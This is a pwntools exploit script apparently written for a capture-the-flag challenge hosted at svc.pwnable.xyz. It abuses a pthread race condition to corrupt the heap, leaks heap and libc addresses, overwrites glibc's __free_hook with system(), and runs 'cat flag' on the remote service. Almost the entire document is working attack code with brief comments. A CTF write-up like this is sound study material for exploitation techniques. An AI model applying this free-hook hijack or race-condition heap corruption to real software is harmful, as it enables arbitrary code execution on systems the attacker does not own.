###Pthread misconfiguration causes race condition leading to heap corruption

from pwn import *

###Structure
'''
person(0x20) [name(0x18),job(0x18)]
    |   8   |   8   |
0x00|nameptr| jobptr|
0x10|age|   |
'''

###Util
def create(name,job,age):
    r.sendlineafter(('> ','save them\n'),'1')
    r.sendafter('Name: ',name)
    r.sendafter('Job: ',job)
    r.sendlineafter('Age: ',str(age))

def edit(idx,name,job,age):
    r.sendlineafter(('> ','save them\n'),'2')
    r.sendlineafter('change?\n',str(idx))
    r.sendafter('Name: ',name)
    r.sendafter('Job: ',job)
    r.sendlineafter('Age: ',str(age))

def create_0x30(data):
    r.sendlineafter(('> ','save them\n'),'3')
    r.sendafter('say?\n',data)

def start_thread():
    r.sendlineafter(('> ','save them\n'),'4')
    r.recvuntil('!!!!ALERT!!!\n')
    return r.recvuntil(' has',drop=True)

def end_thread():
    r.sendlineafter(('> ','save them\n'),'5')

###Addr
#  libc2.24
main_arena_offset = 0x393640
unsorted_bin_offset = main_arena_offset+0x58
free_hook_offset = 0x395798
system_offset = 0x404f0

###Exploit
r = remote('svc.pwnable.xyz',30045)

###Prealloc continuous chunks to avoid address space becoming messy due to create_thread()
create('M30W','M30W',1)
create('M30W','M30W',2)

###Leak heap addr with fastbin ptr
start_thread()
end_thread()
create(b'\x01',b'\x01',2)
heap = u64(start_thread().ljust(8,b'\x00'))-1
print(hex(heap))
end_thread()

###Not necessary, but cleaning up makes the exploit more understandable
start_thread()
end_thread()

###Edit chunks size to create small bin chunks
create('M30W','M30W',1)
create('M30W','M30W',2)
start_thread()
create_0x30(p64(heap+0x60)+p64(heap+0xb0))
edit(2,p64(0)+p64(0x91),p64(heap+0x100)+p64(heap+0xb0),2)
edit(2,p64(0),p64(0),2)
end_thread()

###Leak unsorted bin addr by freeing cmall chunk
start_thread()
create('M30W','M30W',2)
create(b'\x01','M30W',3)
create('M30W','M30W',4)
end_thread()
unsorted_bin_addr = (u64(start_thread()+b'\x00\x00')&0xffffffffffffff00)+(unsorted_bin_offset&0xff)
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(libc_base))

###Hijack free hook with system and cat flag
###Noticebly, calling system('/bin/sh') causes all sorts of problem since if the input is catched by main thread, error occurs and exit will be called
###Hijacking exit handlers to get shell robustly is possible, but since the exploit will become far more complex, I'll settle with just getting flag
create_0x30(p64(libc_base+free_hook_offset)+p64(heap+0x70))
edit(3,p64(libc_base+system_offset),p64(heap+0x90)+p64(heap+0x70),3)
edit(3,b'cat flag\x00',p64(0),3)
end_thread()
start_thread()

r.interactive()
